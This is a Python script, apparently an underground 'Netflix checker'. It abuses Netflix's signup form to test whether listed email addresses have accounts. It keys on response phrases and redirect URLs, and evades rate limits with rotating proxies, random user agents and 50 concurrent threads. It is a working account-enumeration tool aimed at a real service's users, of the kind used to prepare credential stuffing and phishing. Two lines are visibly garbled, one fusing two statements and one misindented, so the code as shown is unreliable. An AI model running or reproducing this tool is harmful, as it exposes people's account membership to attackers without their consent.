#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Netflix Email Checker v3 - Signup Simulation (NO OTP)
"""

import requests
import re
import time
import random
from concurrent.futures import ThreadPoolExecutor
import threading
from proxy_manager import ProxyManager


AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
]


class NetflixChecker:
    def __init__(self, proxy_manager=None, max_workers=50, debug=False):
        self.proxy_manager = proxy_manager
        self.max_workers = max_workers
        self.debug = debug

    def _hdr(self, ref='https://www.netflix.com/signup/regform'):
        return {
            'User-Agent': random.choice(AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.netflix.com',
            'Referer': ref,
        }

    def _token(self, sess, proxies=None):
        try:
            r = sess.get('https://www.netflix.com/signup/regform', proxies=proxies, timeout=15)
            t = r.text
            flw = None
            for c in sess.cookies:
                if 'flwssn' in str(c.name).lower():
                    flw = str(c.value)
            auth = None
            for p in [r'name="authURL"\s+value="([^"]+)"', r'"authURL":"([^"]+)"']:
                m = re.search(p, t)
                if m:
                    auth = m.group(1)
                    break
            return flw, auth
        except Exception as e:
            if self.debug:
                print(f"[DBG] token err: {e}")
            return None, None

    def _signup(self, email, proxy_url=None):
        sess = requests.Session()
        proxies = {'http': proxy_url, 'https': proxy_url} if proxy_url else None        flw, auth = self._token(sess, proxies)
        if not auth and not flw:
            return email, False, "no_token"
        d = {
            'email': email,
            'password': 'FakePass123!',
            'rememberMe': 'false',
            'flow': 'websiteSignUp',
            'mode': 'registration',
            'action': 'continueAction',
            'withFields': 'email,password,rememberMe,flow,mode,action',
        }
        if auth:
            d['authURL'] = auth
        if flw:
            d['flwssn'] = flw
        try:
            r = sess.post('https://www.netflix.com/signup/regform', data=d, headers=self._hdr(), proxies=proxies, timeout=15, allow_redirects=True)
            txt = r.text.lower()
            url = r.url.lower()
            if self.debug:
                print(f"[DBG] {email} | status={r.status_code} | url={r.url}")
                print(f"[DBG] snippet: {r.text[:300]}")
            found = [
                'already have an account', 'already a member', 'sign in to your existing',
                'welcome back', 'use your existing account', 'restart your membership',
                'account exists', 'already registered', 'existing member', 'sign in now',
            ]
            miss = [
                'choose a plan', 'set up your account', 'finish setting up', 'create your account',
                'get started', 'choose your plan', 'plan selection', 'start your free',
                'welcome to netflix', 'new to netflix',
            ]
            for s in found:
                if s in txt:
                    return email, True, 'registered'
            for s in miss:
                if s in txt:
 return email, False, 'not_registered'
            if '/login' in url and 'signup' not in url:
                return email, True, 'registered_url'
            if 'plan' in url or 'getstarted' in url:
                return email, False, 'notreg_url'
            return email, False, f"unknown:{txt[:80]}"
        except requests.exceptions.ProxyError:
            return email, False, 'proxy_err'
        except requests.exceptions.Timeout:
            return email, False, 'timeout'
        except requests.exceptions.ConnectionError:
            return email, False, 'conn_err'
        except Exception as e:
            return email, False, str(e)

    def _one(self, email, pdict=None):
        purl = None
        if pdict and 'url' in pdict:
            purl = pdict['url']
        elif self.proxy_manager:
            pd = self.proxy_manager.get_next()
            if pd:
                purl = pd['url']
        return self._signup(email, purl)

    def check_batch(self, emails, progress_callback=None):
        valids = []
        invalids = []
        cnt = {'done': 0, 'err': 0}
        lock = threading.Lock()
        tot = len(emails)

        def work(email):
            p = self.proxy_manager.get_next() if self.proxy_manager else None
            e, ok, msg = self._one(email, p)
            with lock:
                cnt['done'] += 1
                if ok:
                    valids.append(e)
                else:
                    invalids.append(e)
                    if msg not in ('not_registered', 'notreg_url', 'no_token'):
                        cnt['err'] += 1
                if progress_callback and (cnt['done'] % 20 == 0 or cnt['done'] == tot):
                    progress_callback(cnt['done'], tot, len(valids), len(invalids), cnt['err'])
            time.sleep(random.uniform(0.3, 0.6))

        with ThreadPoolExecutor(max_workers=self.max_workers) as ex:
            list(ex.map(work, emails))

        if progress_callback:
            progress_callback(tot, tot, len(valids), len(invalids), cnt['err'])
        return valids, invalids, cnt['err']


if __name__ == '__main__':
    print("=" * 50)
    print("NETFLIX CHECKER v3 - TEST (Signup Simulation)")
    print("=" * 50)
    test = [
        "your_real_netflix@gmail.com",
        "fake_12345@notreal.com",
    ]
    c = NetflixChecker(proxy_manager=None, max_workers=1, debug=True)
    v, i, e = c.check_batch(test)
    print(f"\nValid={len(v)} | Invalid={len(i)} | Errors={e}")
    for x in v:
        print(f"  [VALID] {x}")
    for x in i:
        print(f"  [INVALID] {x}")